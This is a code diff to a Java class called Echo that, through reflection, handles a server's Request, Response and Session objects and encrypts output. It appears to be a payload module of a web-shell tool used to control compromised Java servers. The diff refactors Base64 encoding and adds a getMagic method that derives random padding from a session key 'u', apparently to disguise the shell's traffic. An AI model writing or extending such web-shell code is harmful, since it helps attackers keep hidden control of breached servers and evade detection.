@@ -4,11 +4,13 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
+import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
 public class Echo {
    public static String content;
+   public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;
@@ -88,22 +90,9 @@ public class Echo {
       while(var5.hasNext()) {
          String key = (String)var5.next();
          sb.append("\"" + key + "\":\"");
-         String value = ((String)entity.get(key)).toString();
+         String value = (String)entity.get(key);
          if (encode) {
-            Class Base64;
-            Object Encoder;
-            if (version.compareTo("1.9") >= 0) {
-               this.getClass();
-               Base64 = Class.forName("java.util.Base64");
-               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
-               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
-            } else {
-               this.getClass();
-               Base64 = Class.forName("sun.misc.BASE64Encoder");
-               Encoder = Base64.newInstance();
-               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
-               value = value.replace("\n", "").replace("\r", "");
-            }
+            value = this.base64encode(value.getBytes());
          }
 
          sb.append(value);
@@ -131,5 +120,39 @@ public class Echo {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private String base64encode(byte[] data) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+
+      Class Base64;
+      try {
+         this.getClass();
+         Base64 = Class.forName("java.util.Base64");
+         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
+      } catch (Throwable var7) {
+         this.getClass();
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Object Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
